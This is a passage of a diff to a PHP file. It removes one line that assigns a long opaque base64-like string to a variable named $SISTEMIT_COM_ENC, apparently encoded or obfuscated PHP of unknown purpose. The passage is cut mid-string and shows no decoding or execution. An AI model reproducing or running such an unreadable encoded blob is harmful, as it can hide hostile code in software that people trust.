@@ -1,3 +1,1134 @@
 <?php
-$SISTEMIT_COM_ENC = "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